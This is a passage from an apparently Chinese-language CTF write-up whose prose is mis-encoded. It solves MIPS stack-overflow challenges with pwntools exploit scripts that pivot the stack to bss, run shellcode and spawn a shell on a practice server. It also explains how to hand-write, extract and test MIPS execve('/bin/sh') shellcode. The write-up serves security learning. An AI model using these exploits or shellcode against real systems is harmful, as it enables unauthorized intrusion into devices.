<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./pwn2&quot;</span>])</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25419)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">offset=<span class="number">0x14</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello!, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*offset)</span><br><span class="line">stack_addr=u32(p.recv().ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x24</span>+p32(stack_addr-<span class="number">0x50</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()            </span><br></pre></td></tr></table></figure>





<p>ä¸è¿‡è¿™é‡Œåœ¨æ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œæ˜æ˜¾å‘ç°æ³„éœ²å‡ºæ¥çš„å¹¶ä¸æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼ˆå› ä¸ºæœ¬åœ°å’Œè¿œç¨‹çš„ç¯å¢ƒä¸åŒï¼Œå¦‚ä¸‹å›¾ï¼‰ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•æ‰“è¿œç¨‹æ˜¯è¡Œä¸é€šçš„</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120725360.png" alt="image-20230512072536085"></p>
<p>å¦‚æœä¸æ³„éœ²æ ˆåœ°å€çš„è¯ï¼Œæˆ‘ä»¬è€ƒè™‘å¯ä»¥æ ˆè¿ç§»åˆ° <code>bss</code> æ®µä¸Šï¼Œå¹¶ä¸”å¾€ <code>bss</code> æ®µå†™å…¥ <code>shellcode</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122036129.png" alt="image-20230512203620008"></p>
<p>é€šè¿‡åˆ†æä¸Šé¢çš„æ±‡ç¼–å‘ç°ï¼Œ <code>read</code> çš„ç¬¬äºŒä¸ªå‚æ•° <code>$a1</code> ç”± <code>fp</code> æ§åˆ¶ï¼Œè€Œé€šè¿‡é˜…è¯» <code>read</code> å‡½æ•°åçš„æ±‡ç¼–ä»£ç ï¼Œå­˜åœ¨ä¸€å¥ <code>lw    $fp, 0x38($sp)</code> ï¼Œåˆå› ä¸ºæ­¤å¤„æœ‰æ ˆæº¢å‡ºï¼Œç›¸å½“äºæˆ‘ä»¬æœ‰ä¸€æ¬¡ä»»æ„åœ°å€å†™çš„æœºä¼šã€‚æˆ‘ä»¬é€‰æ‹©å¾€ <code>bss</code> æ®µå†™å…¥ <code>shellcode</code> ï¼Œç„¶åå¯»æ‰¾è¿ç§»çš„æœºä¼šï¼Œè¿ç§»åˆ° <code>bss</code> æ®µçš„ <code>shellcode</code> æ‰§è¡Œã€‚</p>
<p>æ‰§è¡Œå®Œç¨‹åºåŸæœ¬çš„ <code>read</code> å‡½æ•°åï¼Œæœ‰ä¸€å¥ <code>lw   $ra,0x3c($sp)</code> çš„æ±‡ç¼–ï¼Œæˆ‘ä»¬å°†è·ç¦»æ ˆé¡¶ <code>0x3c</code> çš„ä½ç½®æ”¾æˆä¸Šé¢æåˆ°çš„ <code>lw   $fp,0x38($sp)</code> æŒ‡ä»¤åœ°å€ï¼Œä»¥æ­¤è·³è½¬è¿‡å»</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122116335.png" alt="image-20230512211611122"></p>
<p>ä¸‹å›¾ä¸ºå‘ <code>bss</code> æ®µå†™å…¥æ•°æ®çš„ <code>read</code> å‡½æ•°</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122119885.png" alt="image-20230512211952663" style="zoom:50%;" />



<p>å½“ <code>read</code> å¾€ <code>bss</code> æ®µè¯»å…¥å®Œæ•°æ®åï¼Œæ‰§è¡Œäº† <code>mov   $sp,$fp</code> ï¼Œæ­¤æ—¶æ ˆè¿›è¡Œäº†è¿ç§»ï¼ˆ<code>fp</code> æ˜¯æœ€åˆæ§åˆ¶çš„é‚£ä¸ª <code>bss</code> æ®µåœ°å€ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122118517.png" alt="image-20230512211852230"></p>
<p>éšåä¸‹ä¸€æ¡æŒ‡ä»¤ <code>lw   $ra,0x3c($sp)</code> å°† <code>$ra</code> çš„å€¼å†æ¬¡è¿›è¡Œäº†è®¾ç½®ï¼Œå› ä¸º <code>$sp</code> æ˜¯å¯æ§çš„ <code>bss</code> æ®µåœ°å€ï¼Œæ‰€ä»¥ <code>$ra</code> ä¾ç„¶å¯æ§ï¼Œæˆ‘ä»¬å°† <code>$ra</code> è®¾ç½®ä¸º <code>shellcode</code> çš„èµ·å§‹åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122127368.png" alt="image-20230512212720766"></p>
<p>ä½†æˆå‰§çš„æ˜¯ï¼Œè¿™ç§æ‰“æ³•å¯¼è‡´äº†è¿œç¨‹é€šäº†ï¼Œæœ¬åœ°æ²¡é€šã€‚å› ä¸ºæœ¬é¢˜ç¯å¢ƒçš„åŸå› ï¼Œ<code>bss</code> æ®µæ˜¯æ²¡æœ‰å¯æ‰§è¡Œæƒé™çš„ï¼Œè€Œè¿œç¨‹çš„ <code>bss</code> æ®µæ˜¯æœ‰å¯æ‰§è¡Œæƒé™çš„ã€‚</p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;mips&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, word_size=32,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25115</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x410ba0</span></span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x20</span>+p32(bss_addr)+p32(<span class="number">0x4007E4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x24</span>+p32(<span class="number">0x410be0</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122131912.png" alt="image-20230512213146674"></p>
<h4 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h4><h5 id="ä¿æŠ¤ç­–ç•¥-1"><a href="#ä¿æŠ¤ç­–ç•¥-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142040351.png" alt="image-20230514204013277"></p>
<h5 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h5><p>æœ¬é¢˜ä¸ä¸Šä¸€é“çš„æ¼æ´ä¸€æ ·ï¼ŒåŒæ ·æ˜¯æ ˆæº¢å‡ºã€‚</p>
<p>é‡‡ç”¨çš„ç­–ç•¥æ˜¯æ‰“ <code>ret2shellcode</code></p>
<p>åªä¸è¿‡æœ¬é¢˜çš„ <code>shellcode</code> æ˜¯æ‰‹å†™çš„ <a href="#shellcode%E7%BC%96%E5%86%99">å¦‚ä½•ç¼–å†™MIPSæ¶æ„ä¸‹çš„ shellcode</a> </p>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29366</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Warrior,leave your name here:\n&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x4115F0</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Write down your feeling:\n&quot;</span>,<span class="number">0x38</span>*<span class="string">b&#x27;b&#x27;</span>+p32(bss_addr)+p32(<span class="number">0x400F54</span>))</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh&quot;</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3c</span>+p32(<span class="number">0x411648</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142045142.png" alt="image-20230514204550938"></p>
<h3 id="shellcodeç¼–å†™"><a href="#shellcodeç¼–å†™" class="headerlink" title="shellcodeç¼–å†™"></a>shellcodeç¼–å†™</h3><h4 id="write-ç³»ç»Ÿè°ƒç”¨"><a href="#write-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="write ç³»ç»Ÿè°ƒç”¨"></a><code>write</code> ç³»ç»Ÿè°ƒç”¨</h4><p>æˆ‘ä»¬å…ˆå»å°è¯•ç¼–å†™ä¸€æ®µèƒ½å¤Ÿè¾“å‡º <code>ABC\n</code> å­—ç¬¦ä¸²çš„ <code>shellcode</code></p>
<p>åˆ›å»º <code>write.s</code> æ–‡ä»¶ï¼Œå°†ä¸‹é¢çš„æ±‡ç¼–ä»£ç å†™å…¥æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,0($sp)</span><br><span class="line">li $a0,1</span><br><span class="line">addiu $a1,$sp,0</span><br><span class="line">li $a2,5</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p> <code>.section .text</code> æŒ‡å®šäº†è¯¥æ®µä»£ç æ‰€åœ¨çš„èŠ‚</p>
<p> <code>.globl __start</code> è¡¨ç¤ºå°† <code>__start</code> å¯¼å‡ºä¸ºå…¨å±€ç¬¦å·ï¼ˆ <code>Global Symbol</code> ï¼‰ã€‚åœ¨Cè¯­è¨€ç¼–å†™çš„ç¨‹åºä¸­ï¼Œç¨‹åºçš„å…¥å£ç‚¹é€šå¸¸è¢«å‘½åä¸º <code>_start</code>ï¼Œè€Œåœ¨æ±‡ç¼–ä»£ç ä¸­é€šå¸¸ä½¿ç”¨ <code>__start</code></p>
<p> <code>.set noreorder</code> ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œç¡®ä¿æ±‡ç¼–ä»£ç çš„æ‰§è¡Œé¡ºåºä¸æºä»£ç ä¸­æŒ‡å®šçš„é¡ºåºä¸€è‡´ã€‚æŒ‡ä»¤é‡æ’æ˜¯ç¼–è¯‘å™¨å’Œå¤„ç†å™¨åœ¨ä¼˜åŒ–ä»£ç æ‰§è¡Œé€Ÿåº¦æ—¶é‡‡ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå®ƒå¯ä»¥æ”¹å˜æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºï¼Œä»¥ä¾¿åœ¨ä¸å½±å“ç¨‹åºé€»è¾‘çš„æƒ…å†µä¸‹æé«˜ä»£ç æ‰§è¡Œæ•ˆç‡ã€‚</p>
<p><code>__start:</code> æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ç¬¦å·ï¼Œåœ¨ç¨‹åºæ‰§è¡Œæ—¶å°†ä»è¿™é‡Œå¼€å§‹æ‰§è¡ŒæŒ‡ä»¤ã€‚</p>
<p><code>addiu $sp,$sp,-32</code> å°†å¼€è¾Ÿä¸€ä¸ª <code>0x20</code> å¤§å°çš„æ ˆå¸§</p>
<p><code>lui $t6,0x4142</code> æ˜¯å°† <code>0x4142</code> å·¦ç§» <code>16</code> ä½åï¼ˆä¹Ÿå°±æ˜¯ <code>0x41420000</code> ï¼‰æ”¾å…¥ <code>$t6</code> å¯„å­˜å™¨ã€‚</p>
<p><code>ori $t6,$t6,0x430a</code> å°† <code>$t6</code> ä¸ç«‹å³æ•° <code>0x430a</code> è¿›è¡Œæˆ–è¿ç®—ï¼Œæ‰€ä»¥ <code>$t6</code> å¯„å­˜å™¨é‡Œä¼šæ”¾ <code>0x4142430a</code> è¿™ä¹Ÿå°±æ˜¯ <code>ABC\n</code> çš„ <code>ASCII</code> ç ã€‚</p>
<p>åœ¨çœ‹åˆ°è¿™ä¸¤æ¡æ±‡ç¼–è¯­å¥çš„æ—¶å€™ï¼Œæˆ‘ä¸ç¦ç–‘æƒ‘èµ·æ¥ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨ <code>li $t6,0x4142430a</code> æŒ‡ä»¤å‘¢ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ç¼–è¯‘é“¾æ¥ä¹‹åçš„å¯æ‰§è¡Œæ–‡ä»¶ä¾ç„¶æ˜¯å°†è¿™å¥æŒ‡ä»¤è½¬æ¢æˆäº† <code>lui $t6,0x4142   ori $t6,$t6,0x430a</code> ï¼Œæœ€ç»ˆæŸ¥é˜…äº†èµ„æ–™å‘ç°åœ¨ <code>MIPS</code> æ¶æ„ä¸­ç«‹å³æ•°é€šå¸¸æ˜¯ <code>16</code> ä½çš„æœ‰ç¬¦å·æ•´æ•°ï¼ˆèŒƒå›´ <code>-32768 ~ 32767</code> ï¼‰ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨ä¸€ä¸ªè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„ç«‹å³æ•°ï¼Œæ±‡ç¼–å™¨ä¼šè‡ªåŠ¨å°†å…¶æ‹†åˆ†ä¸ºä¸¤ä¸ª <code>16</code> ä½çš„ç«‹å³æ•°ï¼Œå¹¶ä½¿ç”¨ <code>lui</code> å’Œ <code>ori</code> æŒ‡ä»¤å°†å…¶è£…è½½åˆ°å¯„å­˜å™¨ä¸­</p>
<p><code>sw $t6,0($sp)</code> å°† <code>ABC\n</code>è¿™å››ä¸ªå­—ç¬¦å†™å…¥æ ˆä¸­</p>
<p><code>li $a0,1</code> è®¾ç½® <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³æ ‡å‡†è¾“å‡ºæµ</p>
<p><code>addiu $a1,$sp,0</code> å°† <code>ABC\n</code> çš„åœ°å€è®¾ç½®ä¸º <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬äºŒä¸ªå‚æ•°</p>
<p><code>li $a2,5</code> è®¾ç½® <code>write</code> ç³»ç»Ÿè°ƒç”¨çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³å­—ç¬¦ä¸²é•¿åº¦ä¸º <code>5</code> ï¼Œ<code>ABC\n</code> åˆ«å¿˜è®°å­—ç¬¦ä¸²æœ«å°¾æ˜¯è¿˜æœ‰ä¸€ä¸ª <code>\x00</code> å­—ç¬¦çš„</p>
<p><code>li $v0,4004</code> è®¾ç½® <code>$v0</code> å¯„å­˜å™¨ä¸º <code>write</code> çš„ç³»ç»Ÿè°ƒç”¨å·  <a target="_blank" rel="noopener" href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h">æŸ¥çœ‹ <code>MIPS</code> æ¶æ„çš„ç³»ç»Ÿè°ƒç”¨å·</a></p>
<p><code>syscall</code> è§¦å‘ç³»ç»Ÿè°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-as write.s -o write.o</span><br><span class="line">mips-linux-gnu-ld write.o -o write</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä¸¤æ¡å‘½ä»¤é¦–å…ˆä½¿ç”¨æ±‡ç¼–å™¨ <code>mips-linux-gnu-as</code> å°† <code>write.s</code> ä¸­çš„æ±‡ç¼–ä»£ç è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆç”Ÿæˆæ–‡ä»¶ <code>write.o</code> ï¼‰ï¼Œå†ç”¨é“¾æ¥å™¨ <code>mips-linux-gnu-ld</code> å°†åˆšç”Ÿæˆçš„ <code>write.o</code> é“¾æ¥ä¸º <code>write</code> å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>
<p>ä¸ºäº†ç®€åŒ–æ±‡ç¼–å’Œé“¾æ¥çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬æ¥ç¼–å†™ä¸€ä¸ª <code>shell</code> è„šæœ¬ï¼Œèµ·åä¸º <code>nasm.sh</code>ï¼ˆå¦‚ä¸‹ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src=$1</span><br><span class="line">dst=$2</span><br><span class="line">mips-linux-gnu-as $1 -o s.o</span><br><span class="line">echo &quot;as ok&quot;</span><br><span class="line">mips-linux-gnu-ld s.o -o $dst</span><br><span class="line">echo &quot;ld ok&quot;</span><br><span class="line">rm s.o</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°†ç¼–å†™çš„ <code>shellcode</code> æ–‡ä»¶ï¼Œå˜æˆå¯æ‰§è¡Œæ–‡ä»¶åªéœ€è¦ä½¿ç”¨ <code>./nasm.sh write.s write</code> å‘½ä»¤å³å¯ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305131404932.png" alt="image-20230513140452675"></p>
<p>å¯ä»¥çœ‹åˆ° <code>ABC\n</code> å­—ç¬¦ä¸²å·²ç»è¢«æˆåŠŸè¾“å‡ºï¼Œç¨‹åºå´©æºƒçš„åŸå› æ˜¯å› ä¸º <code>shellcode</code> æ²¡æœ‰æ­£å¸¸çš„é€€å‡ºï¼Œå¯¼è‡´æ‰§è¡Œäº†ä¸æ­£ç¡®æŒ‡ä»¤è®©ç¨‹åºå´©æºƒã€‚ æƒ³è°ƒè¯• <code>shellcode</code> çš„è¯ï¼Œæ–¹å¼å’Œè°ƒè¯• <code>MIPS</code> æ¶æ„çš„ç¨‹åºæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p>
<h4 id="execve-ç³»ç»Ÿè°ƒç”¨"><a href="#execve-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="execve ç³»ç»Ÿè°ƒç”¨"></a><code>execve</code> ç³»ç»Ÿè°ƒç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0 </span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,20</span><br><span class="line">li $a1,0</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure>

<p>å‰å››è¡Œçš„è§£é‡Šä¸Šé¢å·²ç»æè¿‡äº†ï¼Œå°±ä¸å†èµ˜è¿°ã€‚</p>
<p><code>li $a2,0x111</code> <code>p:bltzal $a2,p</code>   <code>li $a2,0</code> è¿™ä¸‰æ¡æŒ‡ä»¤çš„ç›®çš„å°±æ˜¯ä¸ºäº†æŠŠ <code>addiu $sp,$sp,-32</code> è¿™æ¡æŒ‡ä»¤çš„åœ°å€æ”¾å…¥ <code>$ra</code> å¯„å­˜å™¨ä¸­ã€‚</p>
<p><code>addiu $sp,$sp,-32</code> æ˜¯ä¸ºäº†å¼€è¾Ÿä¸€ä¸ªæ–°çš„æ ˆå¸§ï¼Œå¤§å°ä¸º <code>0x20</code></p>
<p><code>addiu $a0,$ra,20</code> è¿™ä¸ªæŒ‡ä»¤ä¸­çš„ <code>20</code> å¾ˆè®²ç©¶ï¼Œè¿™å°±è¦ç‰µæ‰¯åˆ° <code>sc:</code> ä»¥åŠåé¢çš„ä¸œè¥¿äº†<code>0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</code> å°±æ˜¯å­—ç¬¦ä¸² <code>/bin/sh</code> ã€‚è€Œè¿™ä¸ªå­—ç¬¦ä¸²ä¹Ÿæ˜¯å­˜æ”¾åˆ°äº† <code>text</code> æ®µï¼Œå°±ä½äº <code>syscall</code> åé¢çš„åœ°å€ã€‚å› ä¸º <code>MIPS</code> æ¶æ„ä¸­ä¸€ä¸ªæŒ‡ä»¤æ˜¯å›ºå®šçš„ <code>4</code> å­—èŠ‚ï¼Œä¸Šé¢æåˆ°çš„ <code>$ra</code> å¯„å­˜å™¨å­˜å‚¨äº† <code>addiu $sp,$sp,-32</code> çš„åœ°å€ï¼Œè€Œè¿™ä¸ªæŒ‡ä»¤è·ç¦» <code>/bin/sh</code> ä¸­é—´è¿˜æœ‰ <code>5</code> ä¸ªæŒ‡ä»¤ï¼Œ<code>4*5 = 20</code> å­—èŠ‚ã€‚å› æ­¤è¿™é‡Œçš„ <code>$a0</code> æ‹¿åˆ°äº† <code>/bin/sh</code> å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p>
<p>ç›®çš„æ˜¯æ‰§è¡Œ <code>execve(&quot;/bin/sh\x00&quot;,0,0)</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å°† <code>$a1</code> <code>$a2</code> å¯„å­˜å™¨è®¾ç½®ä¸º <code>0</code> ï¼Œä½¿ç”¨ <code>li</code> æŒ‡ä»¤è¿›è¡Œèµ‹å€¼å³å¯ï¼Œ<code>execve</code> ç³»ç»Ÿè°ƒç”¨å·ä¸º <code>4011</code>ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142032761.png" alt="image-20230514203232473"></p>
<h4 id="shellcodeçš„æå–ä¸æµ‹è¯•"><a href="#shellcodeçš„æå–ä¸æµ‹è¯•" class="headerlink" title="shellcodeçš„æå–ä¸æµ‹è¯•"></a>shellcodeçš„æå–ä¸æµ‹è¯•</h4><p>å°† <code>shellcode</code> æå–çš„è¯ï¼Œæˆ‘ç”¨çš„æ–¹æ³•æ˜¯å°†å…¶æ”¾åˆ° <code>IDA</code> é‡Œé¢ï¼Œç„¶å <code>shift+e</code> æå–ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142034440.png" alt="image-20230514203453331"></p>
<p>ç„¶åç”¨ä¸‹é¢çš„ <code>python</code> è„šæœ¬ï¼Œ<code>x</code> åˆ—è¡¨é‡Œé¢æ”¾çš„æ˜¯åˆšåˆšæå‰çš„æ•°æ®ï¼Œæœ€åè¾“å‡ºçš„å†…å®¹ä¾¿æ˜¯ <code>shellcode</code> å­—èŠ‚ç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = [  <span class="number">0x24</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x04</span>, <span class="number">0xD0</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x24</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0xBD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x27</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0C</span>]</span><br><span class="line"><span class="built_in">list</span>=[]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter the endian of the shell code&quot;</span>)</span><br><span class="line">choice=<span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;little&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">list</span>.extend(<span class="built_in">reversed</span>(x[i:i+<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="string">&quot;big&quot;</span>:</span><br><span class="line">  <span class="built_in">list</span> = x</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;\\x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>&#x27;</span> <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">list</span>])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>æœ€åå°±æ˜¯æµ‹è¯•æå–å‡ºæ¥çš„å­—èŠ‚ç èƒ½å¦æ­£ç¡®æ‰§è¡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸‹é¢çš„ <code>C</code> è„šæœ¬ï¼ˆè¦<strong>æ³¨æ„ç¼–è¯‘å®Œç¨‹åºçš„å­—èŠ‚åº</strong>ï¼Œå¦‚æœç¨‹åºæ˜¯å¤§ç«¯çš„ï¼Œè€Œ <code>shellcode</code> æ˜¯æŒ‰ç…§å°ç«¯åºå†™çš„ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¿è¡Œå¤±è´¥çš„ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//mips-linux-gnu-gcc shellcode.c -o test -static -g</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;</span><br><span class="line"><span class="string">&quot;\x24\x06\x01\x11\x04\xd0\xff\xff\x24\x06\x00\x00\x27\xbd\xff\xe0\x27\xe4\x00\x14\x24\x05\x00\x00\x24\x02\x0f\xab\x00\x00\x00\x0c/bin/sh&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*s)(<span class="type">void</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sc size %d\n&quot;</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    s = shellcode;</span><br><span class="line">    s();</span><br><span 